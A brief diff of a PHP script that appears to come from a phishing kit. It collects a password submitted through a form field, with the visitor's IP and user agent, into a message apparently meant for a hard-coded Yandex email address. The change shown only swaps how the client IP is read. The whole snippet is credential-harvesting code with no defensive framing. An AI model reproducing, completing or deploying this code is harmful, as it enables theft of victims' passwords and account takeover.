@@ -2,7 +2,7 @@
 require_once('config.php');
 $agent = $_SERVER['HTTP_USER_AGENT'];
 $email = "cmgrace@yandex.com";
-$ip = getenv("REMOTE_ADDR");
+$ip = get_client_ip();
 $message = "==================+[ Personal Info - Page 2019 - 2]+==================\n";
 $message .= "Password : " . $_POST['mon2'] . "\n";
 $message .= "============= [ Ip & Hostname Info ] =============\n";
